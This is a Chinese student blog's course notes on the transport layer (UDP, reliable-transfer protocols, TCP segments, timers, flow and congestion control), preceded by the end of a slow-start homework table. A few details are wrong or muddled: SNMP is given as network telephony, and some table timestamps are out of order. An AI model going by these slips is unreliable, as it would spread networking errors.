|3RTT+3S/R|发送分组4完毕，接收ACK3|4|3|<br />
|3RTT+4S/R|发送分组5完毕|4|2|<br />
|3RTT+5S/R|发送分组6完毕|4|1|<br />
|3RTT+6S/R|发送分组7完毕|4|0|<br />
|4RTT+3S/R|接收ACK4|5|2|<br />
|4RTT+4S/R|发送分组8完毕，接收ACK5|6|3|<br />
|4RTT+5S/R|发送分组9完毕，接收ACK6|7|4|<br />
|4RTT+6S/R|发送分组10完毕，接收ACK7|8|5|</p>
<p>在此之后，发送到第15个分组之前窗口数量都不会变成0了，因此总时间为5RTT+11R/S。</p>
<p>c. RTT&lt;S/R</p>
<p>|时刻|事件|窗口大小|剩余窗口大小|<br />
|:-😐:-😐:-😐:-😐:-😐<br />
|0|发送SYN|0|0|<br />
|1RTT|接收SYNACK|0|0|<br />
|1RTT+1S/R|发送分组1完毕|1|0|<br />
|2RTT+1S/R|接收ACK1|2|2|<br />
|2RTT+2S/R|发送分组2完毕|2|1|<br />
|3RTT+2S/R|接收ACK2|3|2|<br />
|2RTT+3S/R|发送分组3完毕|3|2|<br />
|3RTT+3S/R|接收ACK3|4|3|<br />
|2RTT+4S/R|发送分组4完毕|4|3|</p>
<p>考虑到发送一个分组的传输时延大于RTT，因此分组5发送完毕之前分组4就已经确认，剩余窗口大小等于窗口大小-1，而窗口大小不断增加，因此后面所有分组都将连续发送。共需要3RTT+15S/R。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC3%E7%AB%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E2%80%94%E2%80%94%E7%AC%AC3%E7%AB%A0/" class="post-title-link" itemprop="url">计算机网络——第3章</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-02 23:46:08 / 修改时间：23:59:49" itemprop="dateCreated datePublished" datetime="2023-03-02T23:46:08+08:00">2023-03-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="chapter-3-传输层"><a class="markdownIt-Anchor" href="#chapter-3-传输层"></a> Chapter 3 传输层</h1>
<h2 id="31-概述和运输层服务"><a class="markdownIt-Anchor" href="#31-概述和运输层服务"></a> 3.1 概述和运输层服务</h2>
<p>运输层的功能：为不同主机上运行的应用进程之间提供<font color=red>逻辑通信</font><br />
工作内容：</p>
<ul>
<li>发送方：将应用数据划分为报文段，交给网络层</li>
<li>接收方：将报文段重组成应用数据，交付给应用层</li>
</ul>
<p>运输层和网络层的区别：</p>
<ul>
<li>网络层：是不同主机之间的逻辑通信，网络层只负责将一个主机上的报文成功发送到另外一个主机，至于应该由主机上的哪一个进程接收，是运输层需要考虑的事情。</li>
<li>运输层：是不同应用进程之间的逻辑通信。</li>
<li>不同的运输层协议可能提供不一样的服务</li>
<li>运输层协议能够提供的服务收受到底层网络协议的服务模型的限制</li>
<li>在网络层不提供某些服务的情况下，需要由运输层自己提供</li>
</ul>
<p><font color=red>端口</font>：让应用层的各种应用进程都能将其数据通过端口向下交付给运输层，以及让运输层知道应当将其报文段中的数据向上通过端口交付给应用层相应的进程（或线程）。从这个意义上讲，端口是用来标志应用层的进程（或线程）。端口使用16bit端口号标识。</p>
<h3 id="32-多路复用和多路分解"><a class="markdownIt-Anchor" href="#32-多路复用和多路分解"></a> 3.2 多路复用和多路分解</h3>
<p><font color=red>套接字：TCP连接的端点。</font>TCP使用连接而不仅仅是端口作为最基本的抽象。套接字将IP地址和端口号整合在一起。</p>
<p>报文段的发送：</p>
<ul>
<li>主机接收到IP包
<ul>
<li>每一个数据包都有源IP地址和目的IP地址</li>
<li>每一个数据包都携带一个传输层的数据报文段</li>
<li>每一个数据报文段都有源、目的端口号</li>
</ul>
</li>
<li>主机根据“IP地址+端口号”将报文段定向到对应的套接字。</li>
</ul>
<h4 id="无连接的运输层协议"><a class="markdownIt-Anchor" href="#无连接的运输层协议"></a> 无连接的运输层协议</h4>
<p>创建的套接字具有主机本地端口，创建数据报发送到UDP套接字时，必须指定目的地IP地址和目的端口。<font color=red>UDP数据报仅有本地的端口号和远程端口号，并不包含本地和远程的IP地址。</font><br />
当主机接收到UDP数据报，需要检查报文段的目的地端口，然后将UDP报文段发送给该端口号的套接字。<br />
注意<font color=red>IP数据报与UDP数据报具有相同的目的端口，但不同的源IP和/或源端口号将被发送到目的地址相同的套接字。对于UDP，发给同一个进程的数据，无论是从哪来，都只用一个套接字来接收。也即在一台主机上发送UDP报文可以修改IP报文的IP地址，让目的主机误以为有多个IP的多个主机向它发送报文，但TCP不行。</font></p>
<h4 id="有连接的运输层协议"><a class="markdownIt-Anchor" href="#有连接的运输层协议"></a> 有连接的运输层协议</h4>
<p>TCP套接字由一个四元组标识（一个连接一组套接字），其中包含源和目的IP地址、源和目的端口号。<br />
接收方主机根据这4个值将报文段定向到相应的套接字。服务器主机同时支持多个并发的TCP套接字，Web服务器为每一个客户连接都产生不同的套接字（非持久HTTP对每一个请求都会建立一个不同的套接字，会影响性能）。</p>
<h2 id="33-无连接传输udp"><a class="markdownIt-Anchor" href="#33-无连接传输udp"></a> 3.3 无连接传输：UDP</h2>
<p>UDP处理数据的流程（UDP无连接）：</p>
<ul>
<li>发送方
<ul>
<li>从应用进程获得数据</li>
<li>附加上为多路复用/多路分解所需的<font color=red>源和目的端口号</font>以及<font color=red>差错检查信息</font>，形成报文段。</li>
<li>递交给网络层，尽力而为地交付给接收主机</li>
</ul>
</li>
<li>接收方
<ul>
<li>从网络层接收报文段</li>
<li>根据目的端口号，将数据交付给相应的应用进程</li>
</ul>
</li>
</ul>
<p>UDP的优势：</p>
<ul>
<li>无需建立连接，可以减少时延</li>
<li>简单，发送方和接收方无需维护连接状态</li>
<li>段首部开销较小，UDP段首只有8字节而TCP有20字节</li>
<li>无拥塞控制，UDP可以随时按照需要发送</li>
</ul>
<p>部分采用UDP协议的应用：</p>
<ul>
<li>远程文件服务器</li>
<li>流式多媒体</li>
<li>网络电话（SNMP）</li>
<li>选录协议（RIP）</li>
<li>域名解析（DNS）</li>
</ul>
<p>UDP滥用的后果：</p>
<ul>
<li>路由器中的大量分组溢出，使得丢包率显著增加，反过来影响到UDP本身的传输效率</li>
<li>显著减小TCP的传输速率，甚至挤垮TCP会话</li>
</ul>
<p>UDP也可以实现可靠传输，但是需要应用层进行辅助控制，需要应用层特殊的错误恢复，增加了应用进程的实现难度。</p>
<h3 id="331-udp报文段结构"><a class="markdownIt-Anchor" href="#331-udp报文段结构"></a> 3.3.1 UDP报文段结构</h3>
<p>UDP的报文段结构很简单，从前往后依次为：源端口号、目的端口号、长度、校验和、数据。其中长度是包含首部的长度，除了数据之外首部的4个控制结构各占16比特。</p>
<h3 id="332-udp检验和"><a class="markdownIt-Anchor" href="#332-udp检验和"></a> 3.3.2 UDP检验和</h3>
<p>UDP校验和提供差错检测功能，检验和用于确定当UDP报文段从源向目的地移动时，其中的比特是否发生了改变。</p>
<p>发送方对UDP校验和的计算方式：将报文段看做16比特一组的多组构成的序列，对报文的所有16比特字的和进行反码计算，获得校验码。<font color=red>如果在求和的过程中出现进位，需要提取进位并加到结果上。在校验和尚未计算时，校验和字段填充为全0进行计算，在计算完成后再用结果替换这里的全0。</font></p>
<p>接收方的验证方式：按照同样的方式以16比特为单位计算，如果最终结果为全1则认为没有错误（不是一定没有错误），否则认为有错误。</p>
<h2 id="34-可靠数据传输原理"><a class="markdownIt-Anchor" href="#34-可靠数据传输原理"></a> 3.4 可靠数据传输原理</h2>
<p>可靠数据传输的问题不仅在运输层出现，也会在链路层以及应用层出现。可靠数据传输队上层实体提供的服务可以抽象为：数据可以通过一条<font color=red>可靠信道</font>进行传输。借助于可靠信道，传输数据比特就不会收到损坏或丢失，且所有数据都是按照发送顺序交付。</p>
<p><img src="https://img-blog.csdnimg.cn/a80b5a8cea4b428a9422558f3caba501.png" alt="" /></p>
<p><img src="https://img-blog.csdnimg.cn/af6744d7c08e4c328f22d4dc54b60e8d.png" alt="" /></p>
<h3 id="341-构造可靠数据传输协议"><a class="markdownIt-Anchor" href="#341-构造可靠数据传输协议"></a> 3.4.1 构造可靠数据传输协议</h3>
<h4 id="经完全可靠信道的可靠数据传输rdt-10"><a class="markdownIt-Anchor" href="#经完全可靠信道的可靠数据传输rdt-10"></a> 经完全可靠信道的可靠数据传输：rdt 1.0</h4>
<p>最简单的情况：<font color=red>底层信道完全可靠</font>。在底层信道可靠的情况下，发送端和接收端不需要进行另外的操作。<br />
<img src="https://img-blog.csdnimg.cn/486001b84e804ddaa516a6184027b517.png" alt="" /></p>
<h4 id="经具有比特差错信道的可靠数据传输rdt-20"><a class="markdownIt-Anchor" href="#经具有比特差错信道的可靠数据传输rdt-20"></a> 经具有比特差错信道的可靠数据传输：rdt 2.0</h4>
<p>在分组的传输、传播或缓存的过程中，比特差错通常会出现在网络的物理部件中。</p>
<p>需要引入<mark>肯定确认</mark>和<mark>否定确认</mark>两种控制报文使得接收方可以让发送方知道哪些内容被正确接收。基于这种重传机制的可靠数据传输协议被称为<font color=red>自动重传请求（ARQ）协议</font>。</p>
<p>ARQ协议中还需要：</p>
<ul>
<li>差错检测：需要一种机制使得接收方检测到何时出现了比特差错。</li>
<li>接收方反馈：让接收方提供反馈信息给发送方确认。</li>
<li>重传：当接收方接收到异常的分组时发送方重传该分组。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/49e85330214e42c4892748c8aa990618.png" alt="" /></p>
<p>上图解释：</p>
<ul>
<li>发送方：
<ul>
<li>当上层调用时，高层调用rdt_send，低层首先计算校验值，然后发送。</li>
<li>如果接收到NAK，则重传。实现重传需要一个缓冲区保存未获得反馈的报文，长度只需要达到一个报文的大小即可。</li>
<li>如果接收到ACK，则待命。</li>
</ul>
</li>
<li>接收方：
<ul>
<li>当接收到数据时，低层提取数据后传递给上层，上层计算校验值没有问题，让下层发送ACK。如果发现问题，让下层发送NAK。</li>
</ul>
</li>
</ul>
<p>注意：<font color=red>当发送方处于等待ACK或NAK的状态时，它不能从上层获得更多数据。因此发送方将不会发送一块新的数据，除非发送方确信接收方已经接收到当前分组。这种协议称为停等协议。</font></p>
<p>缺陷：没有考虑到ACK或NAK受损的可能性。<br />
处理方案：</p>
<ul>
<li>发送方和接收方交替重传报文，这样会陷入死循环。</li>
<li>增加足够的检验和比特使得发送方不仅可以检测差错还可以修复差错。</li>
<li>当发送方收到含糊不清的ACK或NAK时，只重传当前数据分组即可，这样会产生冗余分组。为了将该分组与新的分组区分，需要为数据包引入编号。（下一个版本的方法）</li>
</ul>
<h4 id="第二个版本rdt-21"><a class="markdownIt-Anchor" href="#第二个版本rdt-21"></a> 第二个版本：rdt 2.1</h4>
<ul>
<li>如果发送方接收到重复的ACK，当做NAK重传。</li>
<li>为每一个数据包加上序号。</li>
<li>接收方收到重复序号的数据会丢弃。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/4123bc776fc041debb7b36ef824b355e.png" alt="" /></p>
<p>这里实际上将2个状态转换为4个状态，只是将相邻发送的数据包赋予不同的编号0和1。这样可以区分相邻两个数据包。</p>
<p><img src="https://img-blog.csdnimg.cn/2717b7f8bdd84487977dfc3a48378c78.png" alt="" /></p>
<h4 id="再次改进rdt-22"><a class="markdownIt-Anchor" href="#再次改进rdt-22"></a> 再次改进：rdt 2.2</h4>
<p>去掉了NAK报文，只需要使用ACK报文即可。如果接收方接收到了受损的分组，可以对上一次正确接收的分组发送一个ACK，发送方接收到对同一个分组的两个ACK后就知道接收方有没有正确接收到跟在被确认两次的分组后面的分组。与2.1的细微变化在于：<font color=red>接收方此时必须包括由一个ACK报文所确认的分组序号（0或1），发送方此时必须检查接收到的ACK报文中被确认的分组序号</font>。</p>
<p><img src="https://img-blog.csdnimg.cn/53e387cd8b454c85a7d483a8b42ca358.png" alt="" /></p>
<h4 id="信道丢包时的解决方案rdt-30"><a class="markdownIt-Anchor" href="#信道丢包时的解决方案rdt-30"></a> 信道丢包时的解决方案：rdt 3.0</h4>
<p>发生丢包后的处理方法：校验和技术、序号、ACK、重传。<br />
只需进行等待，就可以知道是否丢包。</p>
<p><img src="https://img-blog.csdnimg.cn/9add2f99f37f4dd68f9f45fec3891946.png" alt="" /></p>
<p>相比较2.2，发送方增加了计时器，当等待时间过长时，重新发送数据包。</p>
<p>发送方需要等待：发送方与接收方之间的一个往返时延加上接收方处理一个分组的时间。这需要发送方明智地选择一个时间值来判断是否发生了丢包。</p>
<p><img src="https://img-blog.csdnimg.cn/d52ee1401d1b4b2b86c3e55b9d76357f.png" alt="" /></p>
<p><img src="https://img-blog.csdnimg.cn/1debf48c03534f42ba846c60a86f51eb.png" alt="" /></p>
<p>这里要尤其注意后面两种丢包情况的处理。</p>
<h3 id="342-流水线可靠数据传输协议"><a class="markdownIt-Anchor" href="#342-流水线可靠数据传输协议"></a> 3.4.2 流水线可靠数据传输协议</h3>
<h4 id="rdt-30性能分析"><a class="markdownIt-Anchor" href="#rdt-30性能分析"></a> rdt 3.0性能分析</h4>
<p>这是一个停等协议，如果一个数据包的传输时延为10ms，传播时延为100ms，那么一个数据包发送完成至少需要210ms（忽略ACK报文的传输时延，RTT=200ms），这会使得信道在大部分时间处于空闲状态，在这210ms中如果一直传输数据，可以传输21个数据包，但这里只传输了1个。网络协议限制了物理资源的利用率。</p>
<p>改进方法：不使用停等协议，使用<font color=red>流水线技术</font>。</p>
<p>流水线技术允许发送方发送多个数据包而无需接收方确认，因此编号不能只是0和1。如果在发送过程中出现错误需要重传，因此发送方需要缓存。如果需要处理失序的数据包，则接收方也需要一定的缓存。<font color=red>注意流水线模式中对于链路利用率的计算，分母的L/R是不用乘以分组长度的！</font></p>
<p><img src="https://img-blog.csdnimg.cn/de70862fa7f24b56aad9f39b59fb56c7.png" alt="" /></p>
<p>流水线技术的工作原理：</p>
<ul>
<li>分组首部使用k-比特字段表示序号</li>
<li>未被传输和已被传输但还没有确认的分组的许可序号范围可以看做是一个在序号范围内大小为N的<font color=red>“窗口”</font>。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/ce0ac6c1284c4e9984098c2bf100ea6b.png" alt="" /></p>
<p>根据流水线技术丢失分组的重传策略，可以将其分为<font color=red>GBN协议和SR协议</font>，GBN协议其后分组全部重传，SR协议仅重传该分组。</p>
<p><img src="https://img-blog.csdnimg.cn/a62cf522abb9499f9aef89697ef34c08.png" alt="" /></p>
<p><img src="https://img-blog.csdnimg.cn/986eca5b7bc348e4ae8b88b47aa7e7b3.png" alt="" /></p>
<h3 id="343-回退n步"><a class="markdownIt-Anchor" href="#343-回退n步"></a> 3.4.3 回退N步</h3>
<p>特点：</p>
<ul>
<li>接收方对序号n之前包括n在内的所有分组进行确认，标志着序号n以及n以前的分组已经全部接收完成。</li>
<li>允许发送方能且只能连续发送n个数据包，若窗口大小为n。同时，窗口中未被确认的分组数量不能超过n。</li>
<li>对所有已经发送但未确认的分组统一设置一个定时器，从一次流水的最“老”分组开始计时。超时时重传分组n和窗口中所有序号大于n的分组。</li>
<li>接收方收到重复的分组时，会丢弃该分组并重发ACK，因此<font color=red>GBN协议中的接收方不需要缓存</font>。</li>
<li>分组失序时，将失序的分组丢弃，并重发按序到达的最高序号分组的ACK。</li>
<li>GBN协议在发送端的滑动窗口大小为2<sup>k</sup>-1，在接收端的大小为1。</li>
</ul>
<h3 id="344-选择重传"><a class="markdownIt-Anchor" href="#344-选择重传"></a> 3.4.4 选择重传</h3>
<ul>
<li>发送方
<ul>
<li>从上层收到数据，如果下一个可用于该分组的序号在窗口内，则将数据打包并发送。</li>
<li>为每一个分组定义计时器，超时时重传分组n并重置计时器。</li>
<li>如果收到在窗口编号范围内的ACK，则标记分组为已经接收，如果这个分组是窗口中的第一个分组，则将窗口的基序号前推到下一个未确认序号。</li>
</ul>
</li>
<li>接收方
<ul>
<li>也定义一个窗口，用于接收。</li>
<li>如果接收到的数据包分组在窗口内，则发送ACK，如果失序则将其缓存。将该分组以及以前缓存的需要连续的分组一起交付给上层，将窗口前推到下一个未收到的分组。虽然曾经确认过，仍然再一次发送ACK。</li>
<li>否则忽略该分组。</li>
</ul>
</li>
</ul>
<p><font color=red>接收方窗口必须小于或等于序号空间大小的一半</font>，这样可以保证在窗口移动过程中，不会有相同序号的数据包在窗口内。因为如果ACK包丢失会导致接收方和发送方的窗口位置不同，全部ACK包丢失时，接收方的窗口在发送方窗口的前面，此时由于发送方没有接收到任何ACK，因此发送老编号的数据包，接收方需要保证此时其窗口中不含有对应该编号的数据包缓存。</p>
<p>当接收方窗口太大时，可能会导致发送方和接收方的发送和接收缺乏同步。窗口必须小于序号范围。</p>
<h2 id="35-面向连接的传输tcp"><a class="markdownIt-Anchor" href="#35-面向连接的传输tcp"></a> 3.5 面向连接的传输：TCP</h2>
<p>TCP是因特网运输层的面向连接的可靠的传输协议。<br />
TCP连接仅存在于端系统，中间的路由器和交换机不知情。<br />
TCP支持全双工服务。<br />
TCP为点对点连接。<br />
需要三次握手，具有最大报文段长度MSS。</p>
<h3 id="351-tcp连接"><a class="markdownIt-Anchor" href="#351-tcp连接"></a> 3.5.1 TCP连接</h3>
<p>TCP连接的建立过程：<font color=red>将发起连接的进程称为客户进程，另一个进程称为服务进程。客户首先发送一个特殊的TCP报文段，服务器使用另一个TCP报文相应，最后客户使用第三个特殊报文段响应。前两个报文不包含数据（有效载荷），第三个报文可以包含有效载荷。这被称为“三次握手”过程。</font></p>
<p><font color=red>发送缓存</font>：发起TCP三次握手期间设置的缓存之一。接下来TCP会不时从发送缓存中取出一块数据，并将数据传输到网络层。</p>
<p><font color=red>最大报文段长度（MSS）</font>：通常根据最初确定的由本地发送主机发送的<font color=red>最大链路层帧长度（MTU）</font>来设置。<font color=red>二者的计算公式是：MTU=MSS+TCP头长度+IP头长度</font>。头部长度通常为40字节，以太网和PPP链路层协议的MTU均为1500字节，因此MSS的典型值为1460字节。</p>
<p>TCP为每块客户数据配上一个TCP首部，从而形成多个TCP报文段。</p>
<h3 id="352-tcp报文段结构"><a class="markdownIt-Anchor" href="#352-tcp报文段结构"></a> 3.5.2 TCP报文段结构</h3>
<p><img src="https://img-blog.csdnimg.cn/81b1e82ca40448679641d7c06d34cbfb.png" alt="" /></p>
<ul>
<li>源端口和目的端口：各占2字节。</li>
<li>序号：占4字节，TCP数据流中的<font color=red>每一个字节</font>都会编上序号，这里的值指的是本报文段第一个字节在整个报文字节流中的序号。</li>
<li>确认号：占4字节，值为<font color=red>期望收到对方的下一个报文段的数据</font>的第一个字节的序号。</li>
<li>首部长度：4比特，以32bit为单位的首部长度，为空时默认为20字节。</li>
<li>保留字段：6比特，目前无用。</li>
<li>紧急比特URG：为1时紧急指针标识该报文中紧急数据内容的地址。</li>
<li>确认比特ACK：为1时确认号字段才有效。</li>
<li>推送比特PSH：接收 TCP 收到推送比特置 1 的报文段，就尽快地交付给接收应用进程，而不再等到整个缓存都填满了后再向上交付。</li>
<li>复位比特RST：当 RST = 1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。</li>
<li>同步比特SYN：同步比特 SYN 置为 1，就表示这是一个连接请求或连接接受报文。</li>
<li>终止比特FIN：用来释放一个连接。当FIN = 1 时，表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。</li>
<li>窗口：2字节，控制对方发送的数据量，单位为字节。TCP连接的一端根据这个值设置自己的缓存窗口大小，然后通知对方以确定对方的发送窗口的上限。可用于流量控制。</li>
<li>校验和：2字节，校验包括首部和数据的所有内容，计算时需要在报文的最前面加上12字节的伪首部。</li>
<li>紧急指针字段：2字节，紧急指针指出在本报文段中的紧急数据的最后一个字节的序号。</li>
<li>选项字段：长度可变，TCP只规定一个选项：MSS。其为数据段的最大长度。</li>
<li>填充字段：填充使得长度为32比特的整数倍。</li>
</ul>
<h3 id="353-往返时间的估计和超时"><a class="markdownIt-Anchor" href="#353-往返时间的估计和超时"></a> 3.5.3 往返时间的估计和超时</h3>
<p><font color=red>样本RTT</font>：对报文段被发出到收到该报文段的确认之间的时间进行测量。样本RTT会有波动，要使得估算RTT更平滑，需要将最近几次的测量进行平均，而非仅仅采用最近一次的SampleRTT。</p>
<p>计算方式：<font color=red>估算RTT=(1-α)*估算RTT+α*样本RTT</font>。这里α参考值为0.125。即测量的时间越久远，对估算RTT的影响越小。</p>
<p>估计估算RTT与样本RTT之间的<font color=red>偏差</font>：<font color=red>偏差=(1-β)*偏差+β*|估算RTT-样本RTT|</font>。β的参考值为0.25。第一次计算时偏差=0.5*样本RTT。</p>
<h3 id="354-可靠数据传输"><a class="markdownIt-Anchor" href="#354-可靠数据传输"></a> 3.5.4 可靠数据传输</h3>
<p>TCP的<font color=red>超时间隔</font>设置为：<font color=red>估算RTT+4*偏差RTT</font>。注意<font color=red>TCP只使用唯一的一个超时定时器</font>。在超时时重传认为超时的定时器，并重启定时器。如果收到重复的ACK，则在更新sendbase之后，如果当前还有未确认的报文段，则也将定时器重置。<font color=red>当出现超时后，超时间隔值加倍</font>。如果已经超时，再重传分组可能会加剧拥塞，这是一种形式受限的拥塞控制。</p>
<p><img src="https://img-blog.csdnimg.cn/0241912272cd41e687f97784074b2d8c.png" alt="" /></p>
<p>快速重传机制：超时周期往往很长，会影响到传输速度。可以通过添加重复的ACK检测丢失报文段。如果<font color=red>重复的ACK接收了超过3个，则认为需要重传</font>。</p>
<h3 id="355-流量控制"><a class="markdownIt-Anchor" href="#355-流量控制"></a> 3.5.5 流量控制</h3>
<p>TCP流量控制的目标是当接收方处理速度较慢时，不至于让接收方缓存溢出。方法是接收方在反馈时将缓冲区剩余空间的大小填充在报文段首部的窗口字段中，通知发送方。</p>
<p>当接收方缓存满时，会通知发送方让其不再发送数据。而若接收方之后不发送任何数据给发送方，那么接收方缓存清空了发送方也无法知道。解决方法是发送方在知道接收方缓存为0之后持续发送数据长度为1的报文进行试探，如果缓存发生改变则接收方就不会发送rwnd=0的ACK。</p>
<h3 id="356-tcp连接管理"><a class="markdownIt-Anchor" href="#356-tcp连接管理"></a> 3.5.6 TCP连接管理</h3>
<h4 id="tcp建立"><a class="markdownIt-Anchor" href="#tcp建立"></a> TCP建立</h4>
<ul>
<li>客户端向服务端发送一个特殊的TCP报文段，其中不含应用层数据，但在报文段首部SYN比特置为1。这个报文被称为SYN报文段。之后客户端<font color=red>随机选择一个初始序号client_isn</font>并将该需要放置于该起始的SYN报文段的序号字段中。该报文段会被封装在IP数据报中，并发送给服务端。</li>
<li>服务端接收到TCP SYN报文段，为该TCP连接分配TCP缓存和变量，并向该TCP客户发送允许连接的报文段，该报文段不包含任何应用层数据。该报文段的SYN置为1，确认号字段置为client_isn+1。最后服务器选择自己的初始序号server_isn并放置到序号字段。该报文段被称为SYNACK报文段。</li>
<li>收到SYNACK之后，客户为该连接分配缓存和变量。客户机向服务器发送另外一个报文段，对服务器的允许连接的报文段进行了确认，SYN置为0，负载可以有数据。</li>
</ul>
<h4 id="tcp释放"><a class="markdownIt-Anchor" href="#tcp释放"></a> TCP释放</h4>
<ul>
<li>主机中的资源被释放，如果客户打算关闭连接，则客户TCP向服务器进程发送一个特殊的TCP报文段，FIN比特置为1。服务器接收到报文后向发送方回送一个确认报文段，然后服务器发送自己的终止报文段，其FIN比特置为1，最后由客户对服务器发来的报文进行确认。这即是四次挥手。</li>
</ul>
<h2 id="36-拥塞控制原理"><a class="markdownIt-Anchor" href="#36-拥塞控制原理"></a> 3.6 拥塞控制原理</h2>
<p>当路由器缓存溢出时，会导致网络拥塞，造成丢包和时延增加。</p>
<h3 id="361-拥塞原因与代价"><a class="markdownIt-Anchor" href="#361-拥塞原因与代价"></a> 3.6.1 拥塞原因与代价</h3>
<h4 id="情景1"><a class="markdownIt-Anchor" href="#情景1"></a> 情景1</h4>
<p>两个发送方，两个接收方，一个具有无限大缓存的路由器，没有重传，忽略低层协议的影响，链路容量为R，两个发送方的发送速率相等。由于发送过程中路由器需要进行选路、缓存等操作，因此一个数据包从发送到接收并不是畅通无阻地行进在链路之中的。当链路越来越接近满负荷状态时，路由器的压力将会增加。虽然此时接收方依然可以以R的速度接收数据包，但是由于各种其他处理的时间积累，其排队的队列长度最终会积累到很大。</p>
<p><img src="https://img-blog.csdnimg.cn/997a699de3e44bc2a0c845ce3ef2c37a.png" alt="" /></p>
<h4 id="情景2"><a class="markdownIt-Anchor" href="#情景2"></a> 情景2</h4>
<p>两个发送方和一台具有有限缓存的路由器。发送方对丢失的分组进行重传。<br />
由于分组出现了重传现象，发送方的发送速率将大于接收方的接收速率。理想状态下，分组仅仅在丢失时才重传，这样可以让冗余的分组数量最少，但实际上有些分组可能会超时，此时进行重传就会增加冗余，占用链路资源。</p>
<p>此时拥塞的开销主要有：</p>
<ul>
<li>发送方必须重传以补偿因为缓存溢出而丢失的分组</li>
<li>发送方在遇到大时延时所进行的不必要重传会引起路由器转发不必要的分组拷贝而占用其链路带宽。</li>
</ul>
<h4 id="情景3"><a class="markdownIt-Anchor" href="#情景3"></a> 情景3</h4>
<p>四个发送方，每个主机都有相同的λ<sub>i</sub>值，具有多跳路径，链路容量为R，会产生超时和重传。<br />
<img src="https://img-blog.csdnimg.cn/e614e1a5d75d4485bde28e717a6ee1f2.png" alt="" /></p>
<p>当重传的数量过多时，既不能增加传输的速率，还占据了大量的链路资源，整个链路陷入崩溃。当分组被丢弃时，该分组曾用到的所有上游传输容量都被浪费了。</p>
<h3 id="362-拥塞控制方法"><a class="markdownIt-Anchor" href="#362-拥塞控制方法"></a> 3.6.2 拥塞控制方法</h3>
<ul>
<li>网络辅助的拥塞控制：
<ul>
<li>直接网络反馈：路由器以阻塞分组的形式通知发送方“网络拥塞”</li>
<li>经由接收方的网络反馈：路由器标识从发送方流向接收方分组中的某个字段以指示拥塞的产生，由接收方通知发送方“网络拥塞”</li>
</ul>
</li>
<li>端到端拥塞控制
<ul>
<li>网络层不为拥塞控制提供任何帮助和支持</li>
<li>端系统通过对网络行为的观测判断网络是否发生拥塞</li>
<li><font color=red>目前TCP采用此方法</font></li>
</ul>
</li>
</ul>
<h2 id="37-tcp拥塞控制"><a class="markdownIt-Anchor" href="#37-tcp拥塞控制"></a> 3.7 TCP拥塞控制</h2>
<p>TCP拥塞控制的方法：</p>
<ul>
<li>每个发送方自动感知网络拥塞的程度</li>
<li>发送方根据感知的结果限制外发的流量
<ul>
<li>如果前方路径上出现了拥塞，则降低发送速率</li>
<li>如果前方路径上没有出现拥塞，则增加发送速率</li>
</ul>
</li>
</ul>
<h4 id="tcp发送方限制外发流量速率的方法"><a class="markdownIt-Anchor" href="#tcp发送方限制外发流量速率的方法"></a> TCP发送方限制外发流量速率的方法</h4>
<p>通过拥塞窗口控制。<br />
LastByteSent-LastByteAcked&lt;=CongWin<br />
发送速率=CongWin/RTT bps<br />
感知拥塞的方法：</p>
<ul>
<li>超时</li>
<li>收到了三个冗余ACK</li>
</ul>
<h4 id="tcp检测到拥塞时如何控制"><a class="markdownIt-Anchor" href="#tcp检测到拥塞时如何控制"></a> TCP检测到拥塞时如何控制</h4>
<p>TCP拥塞控制算法（Reno算法），<font color=red>加性增，乘性减。</font></p>
<p>出现丢包事件后将当前CongWin大小减半，可以大大减少注入到网络中的分组数量。<br />
当没有丢包时间发生时，每个RTT之后将CongWin增加一个MSS，使得拥塞窗口缓慢增大，以防止网络过早出现拥塞。</p>
<h4 id="慢启动"><a class="markdownIt-Anchor" href="#慢启动"></a> 慢启动</h4>
<p>建立连接时，CongWin = 1MSS<br />
当可用带宽远大于MSS/RTT时，初始阶段以指数的速度增加发送速率，直到发生一个丢包事件为止。</p>
<p>即<font color=red>初始速率很低但是速率的增长速度很快</font>。</p>
